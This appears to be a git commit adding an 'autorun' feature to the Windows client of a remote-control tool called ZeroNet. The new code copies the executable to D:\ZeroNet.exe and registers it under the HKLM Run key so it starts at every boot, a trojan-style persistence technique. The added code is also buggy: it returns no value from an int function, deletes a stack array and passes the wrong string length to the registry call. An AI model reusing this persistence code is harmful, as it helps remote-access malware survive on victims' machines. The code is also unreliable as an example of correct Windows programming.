c7ecb31934be6233d264161b7548363be5ab1154
joliph <zhjf1996@163.com>
2017-12-13 14:17:59 +0800

    autorun

--- ZeroNetClient/main.cpp
+++ ZeroNetClient/main.cpp
@@ -19,8 +19,6 @@ int APIENTRY WinMain(HINSTANCE hInstance,
     char szFile[MAX_PATH],*szPt;
 
     GetModuleFileNameA(NULL,szFile,MAX_PATH);//如果该参数为NULL，该函数返回该应用程序全路径
-    //szPt = szFile + strlen(szFile);
-    //while(*--szPt != '\\') ;
 
     CreateMutexA(NULL,FALSE,"ZeroNet");
     if(GetLastError() == ERROR_ALREADY_EXISTS) {
@@ -34,6 +32,41 @@ int APIENTRY WinMain(HINSTANCE hInstance,
         std::cout << "Failed to initialize WSA" << std::endl;
         return -1;
     }
+
+    //复制自身到D盘根目录下
+    char sourcefile[MAX_PATH] = { 0 };
+    DWORD dwRet=GetModuleFileName(NULL, sourcefile, MAX_PATH);
+    HANDLE sourcehandle=CreateFile(sourcefile,GENERIC_READ,0,NULL,OPEN_EXISTING,0,NULL);
+    if(sourcehandle==INVALID_HANDLE_VALUE)
+    {
+        CloseHandle(sourcehandle);
+        return;
+    }
+    DWORD filesize=GetFileSize(sourcehandle,NULL);
+    char *filebuf=new char[filesize+1];
+    DWORD readsize;
+    if(!ReadFile(sourcehandle,filebuf,filesize,&readsize,NULL))
+    {
+        delete []filebuf;
+        CloseHandle(sourcehandle);
+    }
+    else
+    {
+        DWORD writesize;
+        HANDLE desthandle=CreateFile("D:\\ZeroNet.exe",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
+        WriteFile(desthandle,filebuf,filesize,&writesize,NULL);
+        delete []filebuf;
+        CloseHandle(sourcehandle);
+        CloseHandle(desthandle);
+    }
+
+    //将D盘下的文件添加进注册表，实现开机自启动
+    HKEY hKey;
+    LPCTSTR lpRun = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\";
+    long lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey);
+    lRet = RegSetValueEx(hKey, TEXT("ZeroNet"), 0, REG_SZ, (BYTE *)"D:\\ZeroNet.exe", dwRet);
+    RegCloseKey(hKey);
+    delete []sourcefile;
 
     // 主循环
     ZeroClient client;
